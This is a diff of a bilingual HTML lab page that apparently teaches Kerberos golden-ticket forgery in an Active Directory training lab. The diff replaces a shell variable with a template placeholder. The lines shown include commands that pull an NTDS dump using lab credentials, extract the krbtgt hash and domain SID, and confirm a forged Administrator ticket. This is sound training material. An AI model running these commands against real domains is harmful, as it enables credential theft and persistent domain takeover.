@@ -34,9 +34,7 @@ python3 verify_ticket.py Administrator.ccache '&lt;hash_NT_krbtgt&gt;' Administr
     <p>Todo TGT del dominio va cifrado y firmado con la clave de la cuenta <code>krbtgt</code>. Si tienes su hash, puedes fabricar un TGT <em>arbitrario</em>: cualquier usuario (incluso uno inexistente), en cualquier grupo (incluidos Domain Admins), con la caducidad que quieras. El KDC lo aceptará como legítimo porque la firma cuadra. Es persistencia total del dominio hasta que se rote <strong>dos veces</strong> el hash de krbtgt.</p>
 
     <h3>2 · Reunir los ingredientes (del lab AD 10)</h3>
-    <pre>export DC={{ ad_dc_ip }}
-
-nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export KRBTGT_NT=$(grep 'krbtgt' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
 echo "krbtgt hash: $KRBTGT_NT"
@@ -60,7 +58,7 @@ klist    # deberías ver un krbtgt/{{ ad_realm }} válido ~10 años</pre>
 
     <h3>5 · Verificar el forjado localmente</h3>
     <p>Descarga el script de verificación (descifra el TGT con la misma clave que usaste para forjarlo y confirma la identidad reclamada):</p>
-    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get verify_ticket.py'
 
 python3 verify_ticket.py Administrator.ccache "$KRBTGT_NT" Administrator</pre>
     <pre>Ticket descifrado correctamente con la clave proporcionada.
@@ -92,9 +90,7 @@ OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
     <p>Every TGT in the domain is encrypted and signed with the <code>krbtgt</code> account key. If you have its hash you can craft an <em>arbitrary</em> TGT: any user (even a non-existent one), in any group (including Domain Admins), with any lifetime you like. The KDC accepts it as legitimate because the signature checks out. It is full domain persistence until the krbtgt hash is rotated <strong>twice</strong>.</p>
 
     <h3>2 · Gather the ingredients (from lab AD 10)</h3>
-    <pre>export DC={{ ad_dc_ip }}
-
-nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export KRBTGT_NT=$(grep 'krbtgt' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
 echo "krbtgt hash: $KRBTGT_NT"
@@ -118,7 +114,7 @@ klist    # you should see a valid krbtgt/{{ ad_realm }} for ~10 years</pre>
 
     <h3>5 · Verify the forge locally</h3>
     <p>Download the verification script (decrypts the TGT with the same key you used to forge it and confirms the claimed identity):</p>
-    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get verify_ticket.py'
 
 python3 verify_ticket.py Administrator.ccache "$KRBTGT_NT" Administrator</pre>
     <pre>Ticket descifrado correctamente con la clave proporcionada.
